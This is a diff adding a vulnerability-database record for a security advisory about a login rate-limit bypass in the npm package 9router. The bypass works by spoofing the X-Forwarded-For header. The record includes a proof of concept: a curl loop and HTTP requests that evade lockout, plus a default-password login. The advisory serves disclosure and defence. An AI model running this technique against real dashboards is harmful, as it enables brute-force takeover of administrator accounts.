@@ -1,0 +1,393 @@
+advisory_id: GHSA-7cfm-pqrj-xgq7
+datasource_id: github_osv/GHSA-7cfm-pqrj-xgq7
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-7cfm-pqrj-xgq7/GHSA-7cfm-pqrj-xgq7.json
+aliases:
+  - CVE-2026-55501
+summary: |
+  9router: Login brute-force protection bypass via spoofed X-Forwarded-For header
+  ## Summary
+
+  The 9router dashboard login rate limiter derives the client identity from the attacker-controlled `X-Forwarded-For` HTTP header. When 9router is directly exposed, or deployed behind a reverse proxy that does not overwrite untrusted forwarding headers, a remote attacker can rotate the `X-Forwarded-For` value on each login attempt and receive a fresh rate-limit bucket every time.
+
+  This bypasses the dashboard brute-force protection and makes the login lockout mechanism ineffective.
+
+  ## Details
+
+  | Component                    | File                              | Note                                                                        |
+  | ---------------------------- | --------------------------------- | --------------------------------------------------------------------------- |
+  | Dashboard login rate limiter | `src/lib/auth/loginLimiter.js`    | Uses `X-Forwarded-For` as the client identity without a trusted-proxy check |
+  | Dashboard login route        | `src/app/api/auth/login/route.js` | Calls `checkLock()` and `recordFail()` using the spoofable client identity  |
+
+  #### Vulnerable Code
+
+  `src/lib/auth/loginLimiter.js`:
+
+  ```js
+  export function getClientIp(request) {
+    const xff = request.headers.get("x-forwarded-for");
+    if (xff) return xff.split(",")[0].trim();
+    return request.headers.get("x-real-ip") || "unknown";
+  }
+  ```
+
+  The returned value is used as the key for the in-memory rate-limit state:
+
+  ```js
+  const attempts = new Map(); // ip -> { fails, lockUntil, lockLevel, lastFailAt }
+  ```
+
+  The login route uses this value when checking and recording failed login attempts:
+
+  ```js
+  export async function POST(request) {
+    const ip = getClientIp(request);
+    const lock = checkLock(ip);
+
+    if (lock.locked) {
+      return NextResponse.json(
+        { error: `Too many failed attempts. Try again in ${lock.retryAfter}s.` },
+        { status: 429 }
+      );
+    }
+
+    // ... password validation ...
+
+    recordFail(ip);
+  }
+  ```
+
+  Because `X-Forwarded-For` is accepted directly from the request, each unique header value creates a new rate-limit bucket with zero previous failures. An attacker can therefore bypass both the 5-attempt threshold and the progressive lockout durations.
+
+  ## PoC
+
+  ### Step 1 — Baseline: rate limiter triggers when the client identity is stable
+
+  Send repeated failed login attempts with the same `X-Forwarded-For` value:
+
+  ```http
+  POST /api/auth/login HTTP/1.1
+  Host: localhost:20128
+  Content-Type: application/json
+  X-Forwarded-For: 1.1.1.1
+
+  {"password":"wrong-password"}
+  ```
+
+  Observed behavior:
+
+  | Attempt | Response                                              |
+  | ------- | ----------------------------------------------------- |
+  | 1       | `Invalid password. 4 attempt(s) left before lockout.` |
+  | 2       | `Invalid password. 3 attempt(s) left before lockout.` |
+  | 3       | `Invalid password. 2 attempt(s) left before lockout.` |
+  | 4       | `Invalid password. 1 attempt(s) left before lockout.` |
+  | 5       | `Too many failed attempts. Try again in 30s.`         |
+  | 6       | `Too many failed attempts. Try again in 30s.`         |
+
+  This confirms that the lockout logic works when all attempts are assigned to the same rate-limit bucket.
+
+  ### Step 2 — Bypass: rotate `X-Forwarded-For` on each request
+
+  Send failed login attempts while changing the `X-Forwarded-For` value for every request:
+
+  ```bash
+  for i in $(seq 1 10); do
+    curl -s -X POST "http://localhost:20128/api/auth/login" \
+      -H "Content-Type: application/json" \
+      -H "X-Forwarded-For: 10.0.0.$i" \
+      -d '{"password":"wrong-password"}'
+    echo
+  done
+  ```
+
+  Observed response for every request:
+
+  ```json
+  {
+    "error": "Invalid password. 4 attempt(s) left before lockout.",
+    "remainingBeforeLock": 4
+  }
+  ```
+
+  The counter resets to the initial state on every request, and the lockout is never triggered.
+
+  ### Step 3 — Impact amplifier: default dashboard password
+
+  If the instance is still using the default dashboard password, the rate-limit bypass allows an attacker to avoid lockout while attempting to authenticate.
+
+  Example request:
+
+  ```http
+  POST /api/auth/login HTTP/1.1
+  Host: localhost:20128
+  Content-Type: application/json
+  X-Forwarded-For: 99.99.99.99
+
+  {"password":"<default-dashboard-password>"}
+  ```
+
+  Observed response on a default installation:
+
+  ```http
+  HTTP/1.1 200 OK
+  Set-Cookie: auth_token=<redacted>; Path=/; HttpOnly; SameSite=lax
+  ```
+
+  ```json
+  {
+    "success": true
+  }
+  ```
+
+  The default password is an impact amplifier, not the root cause. Even if an administrator changes the password, the rate limiter remains structurally bypassable because the attacker controls the rate-limit key.
+
+  ## Attack Scenario
+
+  1. A remote attacker identifies a publicly reachable 9router dashboard.
+  2. The attacker sends repeated login attempts to `/api/auth/login`.
+  3. For each attempt, the attacker changes the `X-Forwarded-For` header value.
+  4. 9router treats each request as a different client and assigns a fresh rate-limit bucket.
+  5. The attacker can continue brute-force attempts without triggering the configured lockout.
+  6. If the instance uses a weak or default dashboard password, the attacker can gain administrative access.
+
+  ## Impact
+
+  A successful attacker can bypass the dashboard login lockout mechanism and perform unlimited brute-force attempts against the 9router dashboard password.
+
+  If authentication succeeds, the attacker can gain administrative access to the 9router dashboard and may be able to:
+
+  * Access configured provider credentials and API keys.
+  * Change dashboard and authentication settings.
+  * Disable login protection if the application allows it.
+  * Create persistent API keys or other long-lived access tokens.
+  * Modify application configuration.
+  * Chain the access with other server-side functionality exposed by the dashboard.
+impacted_packages:
+  - purl: pkg:npm/9router
+    affected_versions: vers:npm/<=0.4.71
+    fixed_versions: vers:npm/0.4.77
+    affected_packages:
+      - pkg:npm/9router@0.2.13
+      - pkg:npm/9router@0.2.14
+      - pkg:npm/9router@0.2.15
+      - pkg:npm/9router@0.2.16
+      - pkg:npm/9router@0.2.17
+      - pkg:npm/9router@0.2.18
+      - pkg:npm/9router@0.2.19
+      - pkg:npm/9router@0.2.20
+      - pkg:npm/9router@0.2.21
+      - pkg:npm/9router@0.2.22
+      - pkg:npm/9router@0.2.23
+      - pkg:npm/9router@0.2.24
+      - pkg:npm/9router@0.2.25
+      - pkg:npm/9router@0.2.26
+      - pkg:npm/9router@0.2.27
+      - pkg:npm/9router@0.2.29
+      - pkg:npm/9router@0.2.30
+      - pkg:npm/9router@0.2.31
+      - pkg:npm/9router@0.2.32
+      - pkg:npm/9router@0.2.33
+      - pkg:npm/9router@0.2.34
+      - pkg:npm/9router@0.2.36
+      - pkg:npm/9router@0.2.37
+      - pkg:npm/9router@0.2.38
+      - pkg:npm/9router@0.2.39
+      - pkg:npm/9router@0.2.40
+      - pkg:npm/9router@0.2.41
+      - pkg:npm/9router@0.2.42
+      - pkg:npm/9router@0.2.43
+      - pkg:npm/9router@0.2.44
+      - pkg:npm/9router@0.2.45
+      - pkg:npm/9router@0.2.46
+      - pkg:npm/9router@0.2.47
+      - pkg:npm/9router@0.2.48
+      - pkg:npm/9router@0.2.49
+      - pkg:npm/9router@0.2.50
+      - pkg:npm/9router@0.2.51
+      - pkg:npm/9router@0.2.52
+      - pkg:npm/9router@0.2.53
+      - pkg:npm/9router@0.2.54
+      - pkg:npm/9router@0.2.56
+      - pkg:npm/9router@0.2.57
+      - pkg:npm/9router@0.2.58
+      - pkg:npm/9router@0.2.59
+      - pkg:npm/9router@0.2.60
+      - pkg:npm/9router@0.2.61
+      - pkg:npm/9router@0.2.62
+      - pkg:npm/9router@0.2.63
+      - pkg:npm/9router@0.2.64
+      - pkg:npm/9router@0.2.65
+      - pkg:npm/9router@0.2.66
+      - pkg:npm/9router@0.2.67
+      - pkg:npm/9router@0.2.68
+      - pkg:npm/9router@0.2.70
+      - pkg:npm/9router@0.2.71
+      - pkg:npm/9router@0.2.72
+      - pkg:npm/9router@0.2.73
+      - pkg:npm/9router@0.2.74
+      - pkg:npm/9router@0.2.75
+      - pkg:npm/9router@0.2.76
+      - pkg:npm/9router@0.2.77
+      - pkg:npm/9router@0.2.78
+      - pkg:npm/9router@0.2.79
+      - pkg:npm/9router@0.2.80
+      - pkg:npm/9router@0.2.81
+      - pkg:npm/9router@0.2.83
+      - pkg:npm/9router@0.2.84
+      - pkg:npm/9router@0.2.87
+      - pkg:npm/9router@0.2.88
+      - pkg:npm/9router@0.2.89
+      - pkg:npm/9router@0.2.90
+      - pkg:npm/9router@0.2.91
+      - pkg:npm/9router@0.2.92
+      - pkg:npm/9router@0.2.93
+      - pkg:npm/9router@0.2.94
+      - pkg:npm/9router@0.2.95
+      - pkg:npm/9router@0.2.96
+      - pkg:npm/9router@0.2.97
+      - pkg:npm/9router@0.2.98
+      - pkg:npm/9router@0.3.3
+      - pkg:npm/9router@0.3.5
+      - pkg:npm/9router@0.3.6
+      - pkg:npm/9router@0.3.7
+      - pkg:npm/9router@0.3.8
+      - pkg:npm/9router@0.3.9
+      - pkg:npm/9router@0.3.10
+      - pkg:npm/9router@0.3.11
+      - pkg:npm/9router@0.3.12
+      - pkg:npm/9router@0.3.13
+      - pkg:npm/9router@0.3.14
+      - pkg:npm/9router@0.3.15
+      - pkg:npm/9router@0.3.16
+      - pkg:npm/9router@0.3.17
+      - pkg:npm/9router@0.3.19
+      - pkg:npm/9router@0.3.20
+      - pkg:npm/9router@0.3.21
+      - pkg:npm/9router@0.3.22
+      - pkg:npm/9router@0.3.23
+      - pkg:npm/9router@0.3.24
+      - pkg:npm/9router@0.3.27
+      - pkg:npm/9router@0.3.28
+      - pkg:npm/9router@0.3.29
+      - pkg:npm/9router@0.3.30
+      - pkg:npm/9router@0.3.31
+      - pkg:npm/9router@0.3.32
+      - pkg:npm/9router@0.3.33
+      - pkg:npm/9router@0.3.34
+      - pkg:npm/9router@0.3.35
+      - pkg:npm/9router@0.3.36
+      - pkg:npm/9router@0.3.40
+      - pkg:npm/9router@0.3.41
+      - pkg:npm/9router@0.3.42
+      - pkg:npm/9router@0.3.44
+      - pkg:npm/9router@0.3.46
+      - pkg:npm/9router@0.3.47
+      - pkg:npm/9router@0.3.48
+      - pkg:npm/9router@0.3.49
+      - pkg:npm/9router@0.3.50
+      - pkg:npm/9router@0.3.51
+      - pkg:npm/9router@0.3.52
+      - pkg:npm/9router@0.3.53
+      - pkg:npm/9router@0.3.54
+      - pkg:npm/9router@0.3.55
+      - pkg:npm/9router@0.3.56
+      - pkg:npm/9router@0.3.57
+      - pkg:npm/9router@0.3.58
+      - pkg:npm/9router@0.3.60
+      - pkg:npm/9router@0.3.61
+      - pkg:npm/9router@0.3.62
+      - pkg:npm/9router@0.3.63
+      - pkg:npm/9router@0.3.64
+      - pkg:npm/9router@0.3.65
+      - pkg:npm/9router@0.3.66
+      - pkg:npm/9router@0.3.68
+      - pkg:npm/9router@0.3.69
+      - pkg:npm/9router@0.3.70
+      - pkg:npm/9router@0.3.71
+      - pkg:npm/9router@0.3.72
+      - pkg:npm/9router@0.3.74
+      - pkg:npm/9router@0.3.75
+      - pkg:npm/9router@0.3.76
+      - pkg:npm/9router@0.3.78
+      - pkg:npm/9router@0.3.79
+      - pkg:npm/9router@0.3.80
+      - pkg:npm/9router@0.3.81
+      - pkg:npm/9router@0.3.82
+      - pkg:npm/9router@0.3.83
+      - pkg:npm/9router@0.3.84
+      - pkg:npm/9router@0.3.85
+      - pkg:npm/9router@0.3.87
+      - pkg:npm/9router@0.3.89
+      - pkg:npm/9router@0.3.90
+      - pkg:npm/9router@0.3.91
+      - pkg:npm/9router@0.3.96
+      - pkg:npm/9router@0.3.97
+      - pkg:npm/9router@0.3.98
+      - pkg:npm/9router@0.3.99
+      - pkg:npm/9router@0.4.1
+      - pkg:npm/9router@0.4.2
+      - pkg:npm/9router@0.4.3
+      - pkg:npm/9router@0.4.5
+      - pkg:npm/9router@0.4.6
+      - pkg:npm/9router@0.4.8
+      - pkg:npm/9router@0.4.9
+      - pkg:npm/9router@0.4.10
+      - pkg:npm/9router@0.4.11
+      - pkg:npm/9router@0.4.12
+      - pkg:npm/9router@0.4.13
+      - pkg:npm/9router@0.4.14
+      - pkg:npm/9router@0.4.15
+      - pkg:npm/9router@0.4.16
+      - pkg:npm/9router@0.4.17
+      - pkg:npm/9router@0.4.18
+      - pkg:npm/9router@0.4.19
+      - pkg:npm/9router@0.4.20
+      - pkg:npm/9router@0.4.25
+      - pkg:npm/9router@0.4.26
+      - pkg:npm/9router@0.4.27
+      - pkg:npm/9router@0.4.28
+      - pkg:npm/9router@0.4.29
+      - pkg:npm/9router@0.4.31
+      - pkg:npm/9router@0.4.33
+      - pkg:npm/9router@0.4.36
+      - pkg:npm/9router@0.4.37
+      - pkg:npm/9router@0.4.39
+      - pkg:npm/9router@0.4.41
+      - pkg:npm/9router@0.4.45
+      - pkg:npm/9router@0.4.46
+      - pkg:npm/9router@0.4.49
+      - pkg:npm/9router@0.4.50
+      - pkg:npm/9router@0.4.52
+      - pkg:npm/9router@0.4.55
+      - pkg:npm/9router@0.4.58
+      - pkg:npm/9router@0.4.59
+      - pkg:npm/9router@0.4.62
+      - pkg:npm/9router@0.4.63
+      - pkg:npm/9router@0.4.66
+      - pkg:npm/9router@0.4.71
+    fixed_packages:
+      - pkg:npm/9router@0.4.77
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '7.3'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-7cfm-pqrj-xgq7/GHSA-7cfm-pqrj-xgq7.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-307
+  - CWE-290
+references:
+  - url: https://github.com/decolua/9router
+    reference_type:
+    reference_id:
+  - url: https://github.com/decolua/9router/security/advisories/GHSA-7cfm-pqrj-xgq7
+    reference_type: other
+    reference_id: GHSA-7cfm-pqrj-xgq7
+exploits: []
